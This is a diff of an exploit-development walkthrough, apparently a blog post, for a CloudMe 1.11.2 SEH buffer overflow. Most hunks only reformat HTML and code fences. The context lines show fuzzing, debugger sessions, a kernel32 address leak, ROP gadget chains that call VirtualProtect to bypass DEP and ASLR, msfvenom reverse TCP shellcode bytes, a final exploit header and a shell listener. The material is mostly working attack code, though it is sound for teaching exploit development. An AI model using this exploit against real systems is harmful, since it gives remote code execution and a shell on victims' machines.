@@ -71,8 +71,8 @@ bcdedit /set nx AlwaysOn
 <p>   verify that the setting is enabled as shown below</p>
 <dl>
 <dd style="text-align:justify;">
-```
 
+```
 C:\Users\pentest\Desktop\CloudMe&gt;bcdedit /enum
 [...]
 Windows Boot Loader
@@ -89,7 +89,6 @@ osdevice                partition=C:
 systemroot              \Windows
 resumeobject            {1fc46246-40d9-11ea-a45f-a2a235f15fa4}
 nx                      AlwaysOn
-
 ```
 
 </dd>
@@ -99,10 +98,12 @@ nx                      AlwaysOn
 <hr />
 <h3>1. Finding the Vulnerability</h3>
 <p align="justify">In order to find this vulnerability we first need to fuzz the target application. Before using any fuzzing framework we must search what to fuzz. When executing the <b>CloudMe</b> application, if we run the netstat command, we can see that the application is listening on port <b>8888</b>.</p>
+
 ```
 C:\Users\pentest\Desktop&gt;netstat -an | find "8888"
   TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING
 ```
+
 <p align="justify">We can also confirm this using the <b>process hacker 2</b> tool.</p>
 <figure><img class="size-full wp-image-3488 aligncenter" src="{{ site.baseurl }}/assets/images/2021/02/phtool.png" alt="PHTool" width="630" height="143" /></figure>
 <p align="justify">Now lets fuzz this target application using <b>boofuzz</b>. Boofuzz is a fork of and the successor to the venerable Sulley fuzzing framework. More details about the script can be found <a href="https://boofuzz.readthedocs.io/en/stable/">here</a>. The tool can also be found on <a href="https://github.com/jtpereyda/boofuzz">github </a>.The following python script used to fuzz the <b>CloudMe</b> application.</p>
@@ -158,8 +159,7 @@ except Exception as e:
 
 <p align="justify">Running the script above confirms the issue, and now we have a starting point developing the exploit. As we see below in <strong>WinDBG</strong>, when running the script above, the crash occurs</p>
 
-```c
-
+```
 (f24.d98): Access violation - code c0000005 (first chance)
 First chance exceptions are reported before any exception handling.
 This exception may be expected and handled.
@@ -188,10 +188,12 @@ Invalid exception stack at 41414141
 !mona config -set workingfolder c:\logs\%p
 ```
 <p align="justify">From Immunity Debugger we run :</p>
+
 ```
  !mona pattern_create 5000
 ```
 <p align="justify">From WinDBG we run :</p>
+
 ```
 0:009> !load pykd.pyd
 0:009> !py mona pattern_create 5000
@@ -528,7 +530,6 @@ Comparing bytes from file with memory :
 
 
 ```
-
 0:000> !py mona compare -f c:\logs\CloudMe\bytearray.bin -a 0x0022d910
 Hold on...
 [+] Command used:
@@ -1034,7 +1035,9 @@ Qt5Network!ZN9QHostInfo15localDomainNameEv+0x888:
 0022d704 43326643 66433366 35664334 43366643
 ```
 
+<p align="justify">
 As we see, the **ESP** register points to **0x0022d694** which contains the pattern **35624334** (offset 0x224 from the beginning of the payload) ,which is expected considering we are jumping extra 548 bytes from the beginning of the payload ( 1916 - 1368 ).
+</p>
 
 ```
 0:000> ? 0022d694 - 0022d470
@@ -1043,7 +1046,10 @@ Evaluate expression: 548 = 00000224
 Evaluate expression: 0 = 00000000
 ```
 
+<p align="justify">
 At this point we are confident that we are moving in the right way. Furthermore, we should create another proof of concept script in order to see that we have full control when performing our stack pivot. All we want now is to find our landing location where we will put our **ROP** chain to bypass **DEP** protection.
+</p>
+
 
 ```python
 import struct
@@ -1121,19 +1127,28 @@ cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000216
 42424242 ?? ???
 ```
 
+<p align="justify">
 As we see above, we have landed precisely into our placeholder at **"BBBBB"**. At this point we are ready to start building the ROP chain to bypass DEP, but before doing this we will search for gadgets to dynamically load the address of **VirtualProtect** function.
+</p>
+
 
 * * *
 
 ### 5. Leaking the Kernel32 address
 
+
+<p align="justify">
 In order to make this exploit persistent and workable across multiple Windows platforms, we need to find a way to bypass address randomization and dynamically load the address of **VirtualProtect** function. In order to accomplish this task we will try to call **VirtualProtect** by extracting a leaked **kernel32** address found on the stack and using it as a point of reference in order to calculate the desired address. First let’s find the location of the leaked memory address. We will open **Immunity Debugger** and attach the **CloudMe** process. Then we will run the previous python script in order to crash the program and trigger the exception.
 
 Afterwards we will scroll down in stack view at **Immunity Debugger**. Further down the stack view, we should start seeing pointers on the stack, indicating " **RETURN to … from …**". These are saved addresses placed on the stack by functions that were called earlier. If we scroll almost all the way down, we will find a pointer to a **kernel32** address.
+</p>
 
 ![Screenshot 2021-02-16 at 15.22.54]({{ site.baseurl }}/assets/images/2021/02/screenshot-2021-02-16-at-15.22.54.png)
 
+<p align="justify">
 As previously mentioned, after scrolling down the stack view, there is a leaked **kernel32** address **0x0022ED28**
+</p>
+
 
 ```
 0022ED28 |75C44543 CEÄu kernel32.GetFullPathNameW
@@ -1160,7 +1175,9 @@ Before proceeding any further, let’s find all suitable ROP gadgets using **mon
 [...]
 ```
 
+<p align="justify">
 After a while we open **rop\_suggestions.txt** and **rop.txt** in mona’s output directory ( **WinDBG** Debugger’s program folder). First let’s figure out a way to get the current stack address into **EAX** register. **EAX** is the register of choice because there are available gadgets of the following instruction **MOV EAX,DWORD PTR [EAX]** which will allow us to load the **kernel32** address into **EAX**. Before searching for suitable gadgets, we must also refer to the Module info inside the **rop\_suggestions.txt** file in order to check which . **dll** has no restrictions. We found that the following **.dlls** have no restrictions
+</p>
 
 - [Qt5Network.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Network.dll)
 - [Qt5Core.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Core.dll)
@@ -1172,7 +1189,11 @@ After a while we open **rop\_suggestions.txt** and **rop.txt** in mona’s outpu
 - [qsqlite.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\sqldrivers\qsqlite.dll)
 - [Qt5Sql.dll] (C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\Qt5Sql.dll)
 
+
+<p align="justify">
 As we see above, there are many modules that we could search for gadgets. Afterwards, the following gadgets have been found and used in order to load the **Kernel32** address into the EAX register.
+</p>
+
 
 ```
 0x699012c9 # POP EBP # RETN [Qt5Network.dll]
@@ -1184,9 +1205,13 @@ As we see above, there are many modules that we could search for gadgets. Afterw
 0x68ae8a22 # MOV EAX,DWORD PTR [EAX] # RETN [Qt5Core.dll]
 ```
 
+
+<p align="justify">
 Now lets explain what we see above. At the first gadget we put the hex value **0x0385ff88** into the EBP register. Then, EAX register will get that offset as seen at the second gadget. Afterwards , ECX register will load the hex value **0x0362fffc.** Now at the sixth gadget above we subtract the two values and with this technique we get the following address on the stack&nbsp; **0x0022FF8C.** If we scroll down at the stack pane in **Immunity Debugger** we will see that this address is referring to a leaked **Kernel32** address.&nbsp; Before we move further, we must load the leaked **kernel32** address into EAX by using the gadget **MOV EAX,DWORD PTR [EAX].&nbsp;&nbsp;**
 
 In order to see this in practice lets create the following PoC script
+</p>
+
 
 ```python
 import struct
@@ -1232,7 +1257,9 @@ except Exception as e:
   print(sys.exc_value)
 ```
 
+<p align="justify">
 Below is the debugging session with **WinDBG** which shows the ROP gadgets in action:
+</p>
 
 ```
 0:000> bp 0x6998fb2e
@@ -1339,7 +1366,11 @@ Qt5Core!ZNK12QEasingCurve4typeEv+0x4:
 68ae8a24 c3 ret
 ```
 
+
+<p align="justify">
 As seen above in red, after the **MOV EAX,DWORD PTR [EAX]** instruction is executed, the leaked kernel address is now loaded into EAX. Below we are doing the same demonstration with **Immunity Debugger** which shows the leaked **kernel32** address at the stack pane below:
+</p>
+
 
 ![Screenshot 2021-02-17 at 11.12.54]({{ site.baseurl }}/assets/images/2021/02/screenshot-2021-02-17-at-11.12.54-1.png)
 
@@ -1347,7 +1378,10 @@ Also we can see that the leaked **kernel32** address is loaded into EAX.
 
 ![Screenshot 2021-02-17 at 11.22.36]({{ site.baseurl }}/assets/images/2021/02/screenshot-2021-02-17-at-11.22.36-1.png)
 
+
+<p align="justify">
 At this point we can calculate the **VirtualProtect** address using the leaked **kernel32** address from the stack.
+</p>
 
 * * *
 
@@ -1360,14 +1394,22 @@ At this section we will see how to calculate the address of **VirtualProtect** i
 762a20d8 kernel32!VirtualProtect (<no parameter info>)
 ```
 
+
+<p align="justify">
 So, as we see above , the **VirtualProtect** address is **0x762a20d8**.&nbsp; Because of the address randomization the base address of **kernel32.dll** could change; however, the position of **VirtualProtect** relative to the leaked **kernel32** address **0x762f3c45** remains constant. Because **VirtualProtect** ( **0x762a20d8** ) is less than the leaked address ( **0x762f3c45** ), we can get the address of **VirtualProtect** into EAX while avoiding null bytes by adding a negative offset as follows:
+</p>
+
 
 ```
 0:019\> ? kernel32!VirtualProtect - 0x762f3c45 
 Evaluate expression: -334701 = fffae493
 ```
 
+
+<p align="justify">
 The following gadgets have been found and used in order to load the **VirtualProtect** address dynamically into our exploit.
+</p>
+
 
 ```
 0x68a812c9 # POP EBP # RETN [Qt5Core.dll]
@@ -1375,11 +1417,16 @@ The following gadgets have been found and used in order to load the **VirtualPro
 0x61ba8137 # ADD EAX,EBP # RETN [Qt5Gui.dll]
 ```
 
+<p align="justify">
 At the first gadget, EBP is assigned with the hex value **0xfffae493**. Then, adding the two values from EAX and EBP will then give us the address of **VirtualProtect** and the result will be saved in EAX.
+</p>
 
 ![VirtualProtect]({{ site.baseurl }}/assets/images/2021/02/virtualprotect.png)
 
+<p align="justify">
 Below is an updated PoC that implements the ROP gadgets showed before in order to calculate the **VirtualProtect** address dynamically and place it into EAX.
+</p>
+
 
 ```python
 import struct
@@ -1431,7 +1478,10 @@ except Exception as e:
    print(sys.exc_value)
 ```
 
+<p align="justify">
 Below is a snippet of the debugging session illustrating the newly added ROP gadgets:
+</p>
+
 
 ```
 0:000> bp 0x6998fb2e
@@ -1563,7 +1613,9 @@ Qt5Gui!ZN7QWindow4setXEi+0x79:
 61ba8139 c3 ret
 ```
 
+<p align="justify">
 As shown above in red, after executing the last gadget, the address of **VirtualProtect** ( **0x762a20d8** ) will be stored in the EAX register.
+</p>
 
 * * *
 
@@ -1581,6 +1633,7 @@ BOOL WINAPI VirtualProtect(
 
 ```
 
+<p align="justify">
 In order to implement the ROP chain to bypass DEP we will use the **PUSHAD** technique as follows :
 
 - Registers EAX through ESI are populated with the **VirtualProtect** function parameters and the necessary padding (EDI and EAX)
@@ -1590,6 +1643,8 @@ In order to implement the ROP chain to bypass DEP we will use the **PUSHAD** tec
 At this point we are about to create the ROP chain that will enforce DEP bypass.
 
 The PUSHAD instruction&nbsp; **always** pushes all 8 general purpose registers onto the stack. A single **PUSHAD** instruction is equivalent to the following
+</p>
+
 
 ```
 Push EAX
@@ -1624,9 +1679,15 @@ From **Windbg** , using **mona.py** we can generate the ROP chain as follows
 [...]
 ```
 
-Unfortunately, the ROP chains generated with **mona.py** won't fit our needs, because some gadgets are missing. Nevertheless, we can still implement the ROP chain manually with the help of the generated gadgets from **mona.py.** Also, the ROP chain should be manually implemented, because we have already used some gadgets before, in order to dynamically load the **VirtualProtect** address, and this should cause changes to the sequence of the chain and also the sequence of the gadgets.
 
+<p align="justify">
+Unfortunately, the ROP chains generated with **mona.py** won't fit our needs, because some gadgets are missing. Nevertheless, we can still implement the ROP chain manually with the help of the generated gadgets from **mona.py.** Also, the ROP chain should be manually implemented, because we have already used some gadgets before, in order to dynamically load the **VirtualProtect** address, and this should cause changes to the sequence of the chain and also the sequence of the gadgets.
+</p>
+
+
+<p align="justify">
 Also one missing gadget added to the chain ( **jmp esp** ) which has been produced by **ROPgadget** tool :
+</p>
 
 ```
 python ROPgadget.py --binary "C:\Users\pentest\AppData\Local\Programs\CloudMe\CloudMe\libwinpthread-1.dll" --only "jmp" --depth 5 --badbytes "00"
@@ -1670,13 +1731,18 @@ The following snippet shows the setup of **VirtualProtect** using ROP gadgets
 0x64b4d6cd # JMP ESP [libwinpthread-1.dll]
 ```
 
+
+<p align="justify">
 The first two lines above will align our return after executing. To achieve this we will be filling EDI with a ROP-NOP as filler so the chain would continue working as intended.At line 3 the ESI register will have the address of **VirtualProtect**. At this point we have to remember that the **VirtualProtect** address, before assigned to ESI register,&nbsp; it was assigned to the EAX register, and that happened because of the gadgets we have used before in order to load the address dynamically. At lines 4 - 8 , the memory protection constant **0x40** (read-write privileges) will be put on EAX register and then into EDX in order to setup the **flNewProtect** argument. At lines 9 - 12 , we set up the size of the region whose access protection attributes are to be changed, in bytes. Here we choose to put **0x201** ( 513 bytes ). At lines 13 - 14 we set up the pointer to the location where **VirtualProtect** needs to return to. This will be the address of the shellcode on the stack. At lines 15 - 17 we set a pointer to variable that will receive the previous access protection value. At line 18 we push all general purpose registers on the stack and then at line 19 we jump to our shellcode.
+</p>
 
 * * *
 
 ### 8. Finalizing the Exploit
 
+<p align="justify">
 The following reverse TCP shellcode will be used in order to exploit the buffer overflow vulnerability.&nbsp;
+</p>
 
 From msfvenom we generate the reverse TCP shellcode :
 
@@ -1720,7 +1786,9 @@ buf += b"\x15\x95\x93\x44\x78\x26\x4e\x8a\x85\xa5\x7a\x73\x72"
 buf += b"\xb5\x0f\x76\x3e\x71\xfc\x0a\x2f\x14\x02\xb8\x50\x3d"
 ```
 
+<p align="justify">
 Now lets finalize our PoC exploit script and see the registers pushed into the stack using **windbg** debugger. The final exploit will be as follows :
+</p>
 
 ```
 # Exploit Title: CloudMe 1.11.2 - SEH/DEP/ASLR Buffer Overflow 
@@ -1851,7 +1919,9 @@ except Exception as e:
    print(sys.exc_value)
 ```
 
+<p align="justify">
 Now, after running the exploit, we can see step by step in the debugger the values of the registers
+</p>
 
 ```
 0:000> bp 0x68ef1b07
@@ -1901,7 +1971,10 @@ Qt5Core!ZN8qfloat1613mantissatableE+0x61e7:
 0022d710 90909090
 ```
 
+<p align="justify">
 As we see, after the **PUSHAD** instruction is executed, all of the registers are pushed on the stack in specific order that is necessary to successfully execute the **VirtualProtect**. If we continue the execution, we enter the **kernel32!VirtualProtect** function and disable DEP for the memory region just below the **PUSHAD** ROP chain:
+</p>
+
 
 ```
 eax=90909090 ebx=00000201 ecx=68ee6b16 edx=00000040 esi=762a20d8 edi=6d9c1011
@@ -1924,7 +1997,10 @@ KERNELBASE!VirtualProtect+0x2:
 [..snip..]
 ```
 
+<p align="justify">
 If we still continue the execution we can see below that now is possible to execute commands on the stack:
+</p>
+
 
 ```
 [..snip..]
@@ -2021,13 +2097,19 @@ cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000202
 [..snip..]
 ```
 
+
+<p align="justify">
 And yes, as we see above, we have started executing the NOP sled stored in EAX. Also, we can see in red above that we have moved to the beginning of our shellcode ( compare with the first 2 bytes of the msfvenom shellcode ).&nbsp; At this point we are ready to connect to the target machine and have a shell.
+</p>
 
 * * *
 
 ### 9.&nbsp; Spawning a Shell
 
+<p align="justify">
 Before running the exploit script above we have first run our listener on port 443&nbsp;
+</p>
+
 
 ```
 nv -nlvp 443
